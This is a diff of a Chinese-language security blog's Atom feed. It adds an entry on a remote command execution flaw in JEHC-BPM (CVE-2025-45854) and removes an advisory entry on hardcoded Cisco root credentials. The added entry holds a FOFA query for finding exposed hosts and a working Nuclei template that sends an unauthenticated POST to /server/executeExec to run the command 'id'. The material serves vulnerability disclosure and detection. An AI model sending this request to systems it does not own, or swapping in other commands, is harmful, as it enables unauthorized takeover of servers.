@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-03T05:15:14.786Z</updated>
+  <updated>2025-07-03T06:30:22.398Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>JEHC-BPM Remote Code Execute Vulnerability</title>
+    <link href="http://example.com/2025/07/03/github_4203184563/"/>
+    <id>http://example.com/2025/07/03/github_4203184563/</id>
+    <published>2025-07-03T06:30:22.398Z</published>
+    <updated>2025-07-03T06:30:22.398Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> JEHC-BPM Remote Code Execute Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-45854</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> JEHC-BPM是一款业务流程管理软件，广泛应用于企业级服务中，用于优化和自动化业务流程。它支持多种业务流程的建模、执行和监控，是企业IT基础设施中的重要组成部分。该软件在多个行业中有广泛的应用，尤其是在需要复杂业务流程管理的场景中。</p><p>该漏洞存在于JEHC-BPM的&#x2F;server&#x2F;executeExec组件中，属于命令执行类型。漏洞的根本原因是由于executeExec端点的授权检查不足，攻击者可以直接执行任意命令。这种设计缺陷使得攻击者无需任何形式的认证即可利用此漏洞，从而在受影响的系统上执行恶意代码。</p><p>此漏洞的影响极为严重，因为它允许攻击者在未授权的情况下远程执行任意命令，可能导致完全的系统接管。攻击者可以利用此漏洞窃取敏感数据、破坏服务或部署恶意软件。由于漏洞的利用不需要用户交互，且可以自动化执行，因此它构成了极高的安全风险。企业应立即采取措施，更新至不受影响的软件版本，以防范潜在的攻击。</p><p><strong>产品名称：</strong> JEHC-BPM</p><p><strong>影响版本：</strong> &lt;&#x3D; v2.0.1</p><p><strong>搜索语法：</strong> body&#x3D;”JEHC”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0bff9f0dc7b32d3505f9ce3095210012361c5389/http%2Fcves%2F2025%2FCVE-2025-45854.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0bff9f0dc7b32d3505f9ce3095210012361c5389/http%2Fcves%2F2025%2FCVE-2025-45854.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">45854</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> JEHC-BPM <span class="hljs-operator">-</span> Remote Code Execute<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A Remote Command Execution vulnerability <span class="hljs-keyword">in</span> the component <span class="hljs-symbol">/server/executeExec</span> of JEHC-BPM <span class="hljs-operator">&lt;=</span> v2.<span class="hljs-number">0.1</span> allows attackers to execute arbitrary code. The vulnerability exists due to insufficient authorization checks <span class="hljs-keyword">in</span> the executeExec endpoint which allows direct command execution.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//gist.github.com/Cafe-Tea/bc14b38f4bfd951de2979a24c3358460</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-45854</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">45854</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">862</span>,CWE-<span class="hljs-number">434</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">product:</span> jehc-bpm<br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;JEHC&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,jehc-bpm,rce<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;JEHC&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;XSHI&quot;</span><br>        <span class="hljs-params">case-insensitive:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/server/executeExec</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        &#123;<br>          <span class="hljs-string">&quot;actuator&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;clientIp&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-number">8082</span>,<br>            <span class="hljs-string">&quot;applicationName&quot;</span>: <span class="hljs-string">&quot;testApp&quot;</span>,<br>            <span class="hljs-string">&quot;env&quot;</span>: <span class="hljs-string">&quot;prod&quot;</span>,<br>            <span class="hljs-string">&quot;uploadTime&quot;</span>: <span class="hljs-number">1704523200000</span>,<br>            <span class="hljs-string">&quot;hasPrefixApplicationName&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;clientHttpPrefix&quot;</span>: <span class="hljs-string">&quot;http&quot;</span><br>          &#125;,<br>          <span class="hljs-string">&quot;execParams&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;id&quot;</span><br>          &#125;<br>        &#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=[0-9]+.*gid=[0-9]+.*&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><span class="hljs-comment"># digest: 4a0a004730450220287eb7b2b7af14cf8eaf16107f0a6b08ff23685a8da2b9e8bc4dbcc1210b4270022100e37415282b012f14d33d77a1e8202863e203e7c8f20b1135461ffffa9ae399dd:922c64590222798bb761d5b6d8e72950</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; JEHC-BPM Remote Code Execute Vulnerabil</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
   
   <entry>
     <title>RARLAB WinRAR 目录遍历远程代码执行漏洞</title>
@@ -517,30 +543,6 @@
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability in Cisco Unified Communications Manager (Unified CM) and Cisco Unified</title>
-    <link href="http://example.com/2025/07/02/github_3269282397/"/>
-    <id>http://example.com/2025/07/02/github_3269282397/</id>
-    <published>2025-07-02T19:00:04.930Z</published>
-    <updated>2025-07-02T19:00:04.926Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3q7w-9xf2-2f3g">https://github.com/advisories/GHSA-3q7w-9xf2-2f3g</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-20309">https://nvd.nist.gov/vuln/detail/CVE-2025-20309</a></p></li><li><p><a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssh-m4UBdpE7">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssh-m4UBdpE7</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3q7w-9xf2-2f3g">https://github.com/advisories/GHSA-3q7w-9xf2-2f3g</a></p></li></ul><p><strong>描述：</strong></p><p>A vulnerability in Cisco Unified Communications Manager (Unified CM) and Cisco Unified Communications Manager Session Management Edition (Unified CM SME) could allow an unauthenticated, remote attacker to log in to an affected device using the root account, which has default, static credentials that cannot be changed or deleted.</p><p>This vulnerability is due to the presence of static user credentials for the root account that are reserved for use during development. An attacker could exploit this vulnerability by using the account to log in to an affected system. A successful exploit could allow the attacker to log in to the affected system and execute arbitrary commands as the root user.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3q7w-9xf2-2f3g&quot;&gt;https://github.com/advisories/GHSA-3q7w-9xf2-2f3g&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
